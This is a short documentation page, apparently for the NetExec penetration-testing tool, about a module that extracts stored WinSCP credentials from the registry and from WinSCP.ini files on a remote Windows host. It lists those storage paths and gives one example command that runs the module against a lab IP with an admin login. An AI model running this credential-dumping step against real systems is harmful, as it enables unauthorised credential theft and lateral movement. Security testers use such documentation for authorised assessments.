---
description: Dump WinSCP Credentials stored in the registry or local files
---

# 🆕 Dump WinSCP

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

WinSCP allows to store credentials for connections in the following locations:

* HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions
* %APPDATA%\WinSCP.ini
* %USER%\Documents\WinSCP.ini

These are automatically checked for stored credentials for all users on the system. If there is a saved session and no master password is set, the module will attempt to extract the credentials:

```
nxc smb 192.168.56.24 -u eddard.stark -p FightP3aceAndHonor! -M winscp
```
